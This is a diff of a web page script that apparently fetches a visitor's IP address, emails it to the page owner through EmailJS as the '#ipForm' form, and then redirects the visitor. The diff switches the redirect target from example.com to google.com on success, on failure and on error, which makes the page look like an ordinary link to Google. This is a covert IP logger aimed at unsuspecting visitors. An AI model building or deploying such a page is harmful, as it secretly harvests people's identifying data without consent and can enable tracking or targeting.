@@ -27,15 +27,15 @@
 
         emailjs.sendForm('service_6k65f5v', 'template_tv0xrg9', '#ipForm')
           .then(() => {
-            window.location.href = 'https://example.com'; // Redirect after email is sent
+            window.location.href = 'https://google.com'; // Redirect after email is sent
           }, (error) => {
             console.error('Email send failed:', error);
-            window.location.href = 'https://example.com'; // Redirect anyway
+            window.location.href = 'https://google.com'; // Redirect anyway
           });
       })
       .catch(err => {
         console.error('IP fetch error:', err);
-        window.location.href = 'https://example.com'; // Fallback redirect
+        window.location.href = 'https://google.com'; // Fallback redirect
       });
   </script>
 </body>
